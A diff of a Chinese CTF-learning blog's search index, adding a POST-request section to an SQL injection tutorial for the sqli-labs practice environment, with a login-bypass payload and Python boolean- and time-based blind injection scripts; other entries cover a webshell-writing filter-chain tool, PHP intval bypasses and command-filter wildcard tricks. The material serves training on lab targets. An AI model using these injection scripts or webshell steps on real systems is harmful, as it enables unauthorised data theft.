@@ -14,26 +14,6 @@
       </tags>
   </entry>
   <entry>
-    <title>dirsearch</title>
-    <url>/2024/07/23/dirsearch/</url>
-    <content><![CDATA[<p>&emsp;&emsp;dirsearch用来暴力扫描一些基础的存在目录和文件，实用指数:⭐⭐⭐⭐,kali安装:</p>
-<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/maurosoria/dirsearch.git</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;安装完之后就是安装依赖</p>
-<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> dirsearch  <span class="string">//</span>进入dirsearch目录</span><br><span class="line"><span class="params">(sudo)</span> pip3 install -r requirements.txt <span class="string">//</span>可以tab补全，不能执行就用sudo</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;之后执行dirsearch.py</p>
-<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="comment">(sudo)</span> pytho<span class="symbol">n3</span> dirsearch.py -h  <span class="comment">//查看帮助</span></span><br><span class="line"><span class="comment">(sudo)</span> pytho<span class="symbol">n3</span> dirsearch -u URL <span class="comment">//扫描开始</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;以上就是常规用法，知道扫描就行了。（后期帮助不大）</p>
-]]></content>
-      <categories>
-        <category>WEB</category>
-      </categories>
-      <tags>
-        <tag>工具|脚本 利用</tag>
-        <tag>信息收集</tag>
-        <tag>基础</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>BurpSuite</title>
     <url>/2024/07/25/BurpSuite/</url>
     <content><![CDATA[<p>&emsp;&emsp;BurpSuite做web手要非常熟练的一个工具,实用指数:⭐⭐⭐⭐⭐。关于工具|脚本这一模块我这里就不详细的说明使用方法了，重点是下了自己去试一下，多练（绝对不是因为我懒(っ◞‸◟c)）</p>
@@ -57,38 +37,6 @@
 <figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="meta"><span class="keyword">$a</span> = %00hello</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="数组返回值"><a href="#数组返回值" class="headerlink" title="数组返回值"></a>数组返回值</h3><p>&emsp;&emsp;与其他不同的是，该函数若参数为数组是它的返回值不是FALSE，也不会报错。</p>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>绕过</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hackbar</title>
-    <url>/2024/07/13/hackbar/</url>
-    <content><![CDATA[<p>&emsp;&emsp;hackbar是一个用于谷歌和火狐浏览器的扩展插件，可以在浏览器的扩展直接下载添加，然后按F12即可，具体使用方法和操作可以在网上搜一抓一大把，(建议下载cracked&amp;fixed版本的，新版本好像要激活码还是什么的)我这里只做一个指路引导的作用。（Ｕ・ω・）⊃<br>&emsp;&emsp; 我们可以通过它进行自定义发送，手动构造GET,POST和COOKIE管理等方法，还具备有URL编码，base64编码，MD5加密 等的能力，还有很多功能等你慢慢沉淀挖掘，实用指数⭐⭐⭐⭐⭐</p>
-]]></content>
-      <categories>
-        <category>WEB</category>
-      </categories>
-      <tags>
-        <tag>工具|脚本 利用</tag>
-        <tag>基础</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>intval</title>
-    <url>/2024/07/12/intval/</url>
-    <content><![CDATA[<p>&emsp;&emsp;intval()函数用来获取变量的整数值，使用的时候常见的有两种情况：<br>&emsp;1.转换整数时，返回整数本身<br>&emsp;2.转换字符串时，会从字符串的开始进行转换，直到遇到一个非数字的字符，如果字符串的第一个字符不是整数，则返回0  </p>
-<h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>&emsp;如果它的值为一个数组，只要数组里面有值，那么不论值的数量，返回值都为1，空数组则返回0  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b</span>[]=1;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="built_in">echo</span> intval(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;输出</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Array1</span><br></pre></td></tr></table></figure>
-
-<h3 id="字符串绕过"><a href="#字符串绕过" class="headerlink" title="字符串绕过"></a>字符串绕过</h3><p>&emsp;&emsp;类似于’1000’,’2 or id &#x3D; 1000’的这种带单引号或者有字符的类型，intval()函数会从字符串的开始进行转换，直到遇到非数字的字符，例如第二个转换到or的时候，由于or不是数字类型的字符，从而停止转换，转换的结果就只有2。  </p>
-<h3 id="字符串类型-进制绕过"><a href="#字符串类型-进制绕过" class="headerlink" title="字符串类型&amp;进制绕过"></a>字符串类型&amp;进制绕过</h3><p><img data-src="/images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B&%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87.png" alt="字符串类型&amp;进制绕过"></p>
 ]]></content>
       <categories>
         <category>PHP</category>
@@ -123,6 +71,39 @@
       </tags>
   </entry>
   <entry>
+    <title>dirsearch</title>
+    <url>/2024/07/23/dirsearch/</url>
+    <content><![CDATA[<p>&emsp;&emsp;dirsearch用来暴力扫描一些基础的存在目录和文件，实用指数:⭐⭐⭐⭐,kali安装:</p>
+<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/maurosoria/dirsearch.git</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;安装完之后就是安装依赖</p>
+<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> dirsearch  <span class="string">//</span>进入dirsearch目录</span><br><span class="line"><span class="params">(sudo)</span> pip3 install -r requirements.txt <span class="string">//</span>可以tab补全，不能执行就用sudo</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;之后执行dirsearch.py</p>
+<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="comment">(sudo)</span> pytho<span class="symbol">n3</span> dirsearch.py -h  <span class="comment">//查看帮助</span></span><br><span class="line"><span class="comment">(sudo)</span> pytho<span class="symbol">n3</span> dirsearch -u URL <span class="comment">//扫描开始</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;以上就是常规用法，知道扫描就行了。（后期帮助不大）</p>
+]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+      <tags>
+        <tag>工具|脚本 利用</tag>
+        <tag>信息收集</tag>
+        <tag>基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hackbar</title>
+    <url>/2024/07/13/hackbar/</url>
+    <content><![CDATA[<p>&emsp;&emsp;hackbar是一个用于谷歌和火狐浏览器的扩展插件，可以在浏览器的扩展直接下载添加，然后按F12即可，具体使用方法和操作可以在网上搜一抓一大把，(建议下载cracked&amp;fixed版本的，新版本好像要激活码还是什么的)我这里只做一个指路引导的作用。（Ｕ・ω・）⊃<br>&emsp;&emsp; 我们可以通过它进行自定义发送，手动构造GET,POST和COOKIE管理等方法，还具备有URL编码，base64编码，MD5加密 等的能力，还有很多功能等你慢慢沉淀挖掘，实用指数⭐⭐⭐⭐⭐</p>
+]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+      <tags>
+        <tag>工具|脚本 利用</tag>
+        <tag>基础</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>in_array</title>
     <url>/2024/07/13/in-array/</url>
     <content><![CDATA[<p>&emsp;&emsp;in_array函数的功能用于检查数组是否存在某个值或者是不是数组。定义：布尔型函数，参数为（$needle,$haystack,[$strict &#x3D; FALSE]）,在$haystack中搜索$needle,如果第三个参数$strict的值为TRUE(没有默认为FALSE),则该函数会进行强检查（相等于&#x3D;&#x3D;&#x3D;），检查$needle的类型是否和$haystack中的相同。<font color=red>如果找到$haystack，则返回TRUE,否则返回FALSE。</font></p>
@@ -154,6 +135,39 @@
       </categories>
       <tags>
         <tag>绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>intval</title>
+    <url>/2024/07/12/intval/</url>
+    <content><![CDATA[<p>&emsp;&emsp;intval()函数用来获取变量的整数值，使用的时候常见的有两种情况：<br>&emsp;1.转换整数时，返回整数本身<br>&emsp;2.转换字符串时，会从字符串的开始进行转换，直到遇到一个非数字的字符，如果字符串的第一个字符不是整数，则返回0  </p>
+<h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>&emsp;如果它的值为一个数组，只要数组里面有值，那么不论值的数量，返回值都为1，空数组则返回0  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b</span>[]=1;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="built_in">echo</span> intval(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;输出</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Array1</span><br></pre></td></tr></table></figure>
+
+<h3 id="字符串绕过"><a href="#字符串绕过" class="headerlink" title="字符串绕过"></a>字符串绕过</h3><p>&emsp;&emsp;类似于’1000’,’2 or id &#x3D; 1000’的这种带单引号或者有字符的类型，intval()函数会从字符串的开始进行转换，直到遇到非数字的字符，例如第二个转换到or的时候，由于or不是数字类型的字符，从而停止转换，转换的结果就只有2。  </p>
+<h3 id="字符串类型-进制绕过"><a href="#字符串类型-进制绕过" class="headerlink" title="字符串类型&amp;进制绕过"></a>字符串类型&amp;进制绕过</h3><p><img data-src="/images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B&%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87.png" alt="字符串类型&amp;进制绕过"></p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php_filter_chain_generator</title>
+    <url>/2024/07/14/php-filter-chain-generator/</url>
+    <content><![CDATA[<p>&emsp;&emsp;文件包含漏洞利用流在其中写入一句话木马，实用指数:⭐⭐⭐脚本下载<a href="https://github.com/synacktiv/php_filter_chain_generator">here</a><br>&emsp;&emsp;常用的命令（当然也可以看那里的）  </p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">python3 php_filter_chain_generator<span class="selector-class">.py</span> <span class="attr">--chain</span> <span class="string">&#x27;一句话木马&#x27;</span></span><br></pre></td></tr></table></figure>
+<p> <img data-src="/images/php_filter.png" alt="php_filter"><br>&emsp;&emsp;将回显的链子复制给网页,然后用hackbar或者蚁剑连接即可。<br><img data-src="/images/php_filter2.png" alt="php_filter2"></p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>工具|脚本 利用</tag>
       </tags>
   </entry>
   <entry>
@@ -198,18 +212,6 @@
       </tags>
   </entry>
   <entry>
-    <title>print&amp;print_r</title>
-    <url>/2024/07/13/print-print-r/</url>
-    <content><![CDATA[<p>&emsp;&emsp;print()只能打印出简单类型变量的值（如int,string），输出一个字符串。<br>&emsp;&emsp;print_r()可以打印出复杂类型变量的值（如数组，对象），打印关于变量的易于理解的信息。通常打比赛的时候经常使用的是它。<br>&emsp;&emsp;建议实践，方便理解。</p>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>区别</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>php入门</title>
     <url>/2024/07/14/php%E5%85%A5%E9%97%A8/</url>
     <content><![CDATA[<p>&emsp;&emsp;对于刚接触web题的时候，最先掌握的语言应该是php，不说所有知识点要了解，起码打web题的时候GET和POST方法要会辨别和使用，推荐PHP学习网站  <a href="https://www.runoob.com/php">https://www.runoob.com/php</a><br>&emsp;&emsp;生怕你们不会点，超链接都没有弄(っ’-‘)╮&#x3D;͟͟͞͞🎁) ﾟдﾟ ）</p>
@@ -224,20 +226,6 @@
       </categories>
       <tags>
         <tag>基础</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php_filter_chain_generator</title>
-    <url>/2024/07/14/php-filter-chain-generator/</url>
-    <content><![CDATA[<p>&emsp;&emsp;文件包含漏洞利用流在其中写入一句话木马，实用指数:⭐⭐⭐脚本下载<a href="https://github.com/synacktiv/php_filter_chain_generator">here</a><br>&emsp;&emsp;常用的命令（当然也可以看那里的）  </p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">python3 php_filter_chain_generator<span class="selector-class">.py</span> <span class="attr">--chain</span> <span class="string">&#x27;一句话木马&#x27;</span></span><br></pre></td></tr></table></figure>
-<p> <img data-src="/images/php_filter.png" alt="php_filter"><br>&emsp;&emsp;将回显的链子复制给网页,然后用hackbar或者蚁剑连接即可。<br><img data-src="/images/php_filter2.png" alt="php_filter2"></p>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>工具|脚本 利用</tag>
       </tags>
   </entry>
   <entry>
@@ -328,12 +316,24 @@
       </tags>
   </entry>
   <entry>
+    <title>print&amp;print_r</title>
+    <url>/2024/07/13/print-print-r/</url>
+    <content><![CDATA[<p>&emsp;&emsp;print()只能打印出简单类型变量的值（如int,string），输出一个字符串。<br>&emsp;&emsp;print_r()可以打印出复杂类型变量的值（如数组，对象），打印关于变量的易于理解的信息。通常打比赛的时候经常使用的是它。<br>&emsp;&emsp;建议实践，方便理解。</p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>区别</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sql注入</title>
     <url>/2024/07/27/sql%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p>&emsp;&emsp; 当用户输入账号和密码的时候，web应用会向后台数据库进行一个匹配，如果账号密码正确就会登入。而这个数据库例如MySQL,Oracle等一系列用的语句叫做sql语句，那么我们在传数据的时候，使用sql语句上传就会改变一个原有的结构，从而获取或修改数据库中的数据，而这个，就叫做sql注入。</p>
 <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>&emsp;&emsp;那么在做sql注入的时候，建议先看一下sql语句的基础语法，懂得基础才能理解得更加深刻,OK，在学这个之前，我们要搭配着靶场去使用，实践出来的效果更佳。点击<a href="https://blog.csdn.net/Joker_Dgh/article/details/123913722">靶场环境搭建</a>,当做一个游戏去玩，通关即为胜利（注意php版本要选择5.x版本）</p>
 <h3 id="sql注入基础"><a href="#sql注入基础" class="headerlink" title="sql注入基础"></a>sql注入基础</h3><p>&emsp;&emsp;我们就直接讲思路什么的了，语法基础和逻辑自行去b站了解。</p>
-<h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><p>&emsp;&emsp;注入点分为数字型和字符型（输入字符默认为字符型）。两者的判断方式可以<font color=blue>用id&#x3D;2-1来测试，如果是数字型的，回显的样式应该是id&#x3D;1的情况，如果是字符型的，回显的样式应该是id&#x3D;2的情况。</font><br><img data-src="/images/sql/sql1-1.png" alt="sql1-1"><br>&emsp;&emsp;这是id为1时的name和password<br><img data-src="/images/sql/sql1-2.png" alt="sql1-2"><br>&emsp;&emsp;这是id为2时的name和password<br><img data-src="/images/sql/sql1-2-1.png" alt="sql1-2-1"><br>&emsp;&emsp;这是id为2-1的name和password，很明显，和2的情况是一样的，所以这是字符型。</p>
+<h2 id="get请求"><a href="#get请求" class="headerlink" title="get请求"></a>get请求</h2><h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><p>&emsp;&emsp;注入点分为数字型和字符型（输入字符默认为字符型）。两者的判断方式可以<font color=blue>用id&#x3D;2-1来测试，如果是数字型的，回显的样式应该是id&#x3D;1的情况，如果是字符型的，回显的样式应该是id&#x3D;2的情况。</font><br><img data-src="/images/sql/sql1-1.png" alt="sql1-1"><br>&emsp;&emsp;这是id为1时的name和password<br><img data-src="/images/sql/sql1-2.png" alt="sql1-2"><br>&emsp;&emsp;这是id为2时的name和password<br><img data-src="/images/sql/sql1-2-1.png" alt="sql1-2-1"><br>&emsp;&emsp;这是id为2-1的name和password，很明显，和2的情况是一样的，所以这是字符型。</p>
 <h4 id="判断闭合方式"><a href="#判断闭合方式" class="headerlink" title="判断闭合方式"></a>判断闭合方式</h4><p>&emsp;&emsp;如果是字符型的话，根据语法，既然我们要重新构造一个语句，我们就得把后面的原本语句注释掉，因此我们数值后面需要添加闭合符，语句结尾需要添加注释符。闭合方式有<br><img data-src="/images/sql/%E6%95%B0%E5%80%BC%E9%97%AD%E5%90%88.png" alt="数值闭合"><br><img data-src="/images/sql/%E5%AD%97%E7%AC%A6%E9%97%AD%E5%90%88.png" alt="字符闭合"><br>&emsp;&emsp;然而注释符目前只找到–+(– q),#,%23这三种，判断的方法也很简单，如果<font color=red>所使用的闭合方式结果一样，那么说明不是该闭合方式。反之就是(同时还应判断是否需要添加括号)</font>打个比方，如果输入1”and 1&#x3D;1– q 和 1”and 1&#x3D;2 –q 两次的回显结果一样，说明闭合方式不是双引号，其他同理。原理就不用多讲了吧，如果真是闭合符的话，and后面一真一假，后者肯定报错。<br><img data-src="/images/sql/and1=1.png" alt="and1=1"><br><img data-src="/images/sql/and1=2.png" alt="and1=2"><br>&emsp;&emsp;回显不一样，闭合符号为’（可以试试双引号是否回显是一样）</p>
 <h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>&emsp;&emsp;ok啊，知道闭合方式和注释符之后，我们就可以往期间穿插语句了，那么我们就要学习sql注入的第一步联合注入。<br>&emsp;&emsp;第一步:order by X判断列数，X递增往上加，<font color=blue>如果报错就是超过列数，显示正常就是没有超出，就继续往上加，直到报错退回来。</font><br><img data-src="/images/sql/orderby.png" alt="orderby"><br>&emsp;&emsp;可以看到4报错了，我们就退回来，说明列数只有三列。</p>
 <figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; order <span class="keyword">by</span> <span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
@@ -373,7 +373,13 @@
 <p>&emsp;&emsp;通过try-except获取超时的信息，从而判断出数据库的长度。<br><img data-src="/images/sql/sql9-time1.png" alt="sql9-time1"><br>&emsp;&emsp;那么同理加if和try-except以及timeout从布尔盲注的脚本进行修改就可以取出数据库名。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_length2</span>(<span class="params">database_length</span>):</span><br><span class="line">    <span class="keyword">global</span> url</span><br><span class="line">    database = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, database_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">122</span>):</span><br><span class="line">            payload = <span class="string">f&quot;?id=1&#x27; and if(ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(3),1)--+&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = requests.get(url + payload,timeout=<span class="number">3</span>).text</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                database += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;数据库名为&quot;</span>,database)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> database</span><br></pre></td></tr></table></figure>
 <p>&emsp;&emsp;其余的跟这两种的修改方案一样，我就不一一放出来了，最终可以得到字段<br><img data-src="/images/sql/sql9-time2.png" alt="sql9-time2"></p>
-]]></content>
+<h2 id="post请求"><a href="#post请求" class="headerlink" title="post请求"></a>post请求</h2><p>&emsp;&emsp;做到第十一关，请求方式变为了post请求，变成了更为常见的类型，要求输入用户名和密码，那么大概的sql语句就是username&#x3D;[] and password&#x3D;[],我们也可以测试闭合符看报错（如果有的话）。<br><img data-src="/images/sql/sql11-post.png" alt="sql11-post"><br>&emsp;&emsp;如果我们输入闭合符有报错的，就说明有回显，就可以利用联合注入。<br><img data-src="/images/sql/sql11-1.png" alt="sql11-1"><br>&emsp;&emsp;报错的这段我们分析一下就知道为单引号闭合，我们输入1’是后面闭合变成了双引号，那么就改变了原语句而报错。没分析明白的再去看看基础。<br>&emsp;&emsp;知道了sql语句我们就可以构造一个恒成立的sql语句，也成为万能密码，具体可转至<a href="https://blog.csdn.net/hxhxhxhxx/article/details/108020010">万能密码</a><br>&emsp;&emsp;我用的是<font color=red>1’ or 1&#x3D;1# </font>这个得根据语句进行判断，实在不知道就用BP爆破，这里post请求用的注释符通常用#，具体原因我也不知道，谁懂了可以举个爪。<br><img data-src="/images/sql/sql11-2.png" alt="sql11-2"><br>&emsp;&emsp;条件达成，联合注入即可。</p>
+<h3 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>&emsp;&emsp;注入成功有页面变化无回显，可以使用布尔盲注，只不过这是post请求的，对应的脚本也需要修改。<font color>细节:回显成功的参数是个图片，ctrl+U能收集到信息参数</font><br><img data-src="/images/sql/sql13-post.png" alt="sql13-post"></p>
+<figure class="highlight hsp"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://sql-labs:3601/Less-13/&#x27;</span>  <span class="meta"># 目标URL</span></span><br><span class="line">flag = <span class="string">&quot;../images/flag.jpg&quot;</span>  <span class="meta"># 设置一个回显成功的字样</span></span><br><span class="line">data= &#123;</span><br><span class="line">    <span class="string">&quot;uname&quot;</span> : <span class="string">&quot;a&#x27;) or 1 #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;passwd&quot;</span> : <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;submit&quot;</span> : <span class="string">&quot;Submit&quot;</span></span><br><span class="line">&#125; <span class="meta">#post参数</span></span><br><span class="line"></span><br><span class="line">def get_database_length():</span><br><span class="line">    global url, flag  <span class="meta"># 全局变量</span></span><br><span class="line">    <span class="keyword">length</span> = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        payload = f<span class="string">&quot;1&#x27;) or length((select database()))=&#123;length&#125;#&quot;</span></span><br><span class="line">        data[<span class="string">&quot;uname&quot;</span>] = payload</span><br><span class="line">        response = requests.post(url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">not</span> in response:</span><br><span class="line">            <span class="keyword">length</span> += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;数据库长度为&quot;</span>, <span class="keyword">length</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">length</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;照着修改一下即可。剩下的也是一样的，测长和字符的形式是一样，我就例举两个就行。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_length2</span>(<span class="params">database_length</span>):</span><br><span class="line">    <span class="keyword">global</span> flag, url</span><br><span class="line">    database = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, database_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">122</span>):</span><br><span class="line">            payload = <span class="string">f&quot;1&#x27;) or ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>#&quot;</span></span><br><span class="line">            data[<span class="string">&quot;uname&quot;</span>] = payload</span><br><span class="line">            response = requests.post(url,data=data).text</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> response:</span><br><span class="line">                database += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;数据库名为&quot;</span>,database)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> database</span><br></pre></td></tr></table></figure>
+
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3>]]></content>
       <categories>
         <category>WEB</category>
       </categories>
@@ -452,7 +458,7 @@
 <h5 id="重定向字符"><a href="#重定向字符" class="headerlink" title="重定向字符&lt;,&lt;&gt;"></a>重定向字符&lt;,&lt;&gt;</h5><p>&emsp;&emsp;上面也提过一嘴，就是把&lt;后面跟的文件取代键盘作为新的输入设备，具体原理我也不清楚（谁会了到时候指导我一下ヾ(❀╹◡╹)ﾉﾞ❀~），不推荐使用，用法1：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span>&lt;flag.php</span><br><span class="line"><span class="built_in">cat</span>&lt;&gt;flag.php</span><br></pre></td></tr></table></figure>
 <p>&emsp;&emsp;而这另一种用法较为广泛，例如题目中出现类似与shell_exec()这种函数没有回显的情况下，我们可以用重定向，将结果放入指定的文件中,用法2:</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ls</span> / &gt; <span class="number">1</span>.txt</span><br><span class="line"><span class="attribute">cat</span> flag &gt; <span class="number">2</span>.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> / &gt; 1.txt</span><br><span class="line"><span class="built_in">cat</span> /flag &gt; 2.txt</span><br></pre></td></tr></table></figure>
 
 <h4 id="特定字符过滤绕过"><a href="#特定字符过滤绕过" class="headerlink" title="特定字符过滤绕过"></a>特定字符过滤绕过</h4><p>&emsp;&emsp;这种过滤一般针对一些特定的字符，全过滤的在后面，比如flag这四个，或者f,l,a,g四个字符单独过滤，后者意味这不能有这四个字母的出现，前者只是它们不能连着，很显然，后者相对难处理些，那么，就看看有哪些方法吧。</p>
 <h5 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h5><p>&emsp;&emsp;通配符是整个操作系统都认可的一种形式，用来模糊搜索文件。只有这两个?和*<br>&emsp;&emsp;?可以代表任何<code>单个</code>字符串，来让系统自行继续匹配搜索。例如<font color=blue>cat fl?g.tx?</font><br>&emsp;&emsp;*可以进行模糊匹配，代表任何字符串，让系统自己猜我要什么- ̗̀(๑ᵔ⌔ᵔ๑)。例如<font color=red>cat f*</font>(如果有多个匹配结果会同时显示)</p>
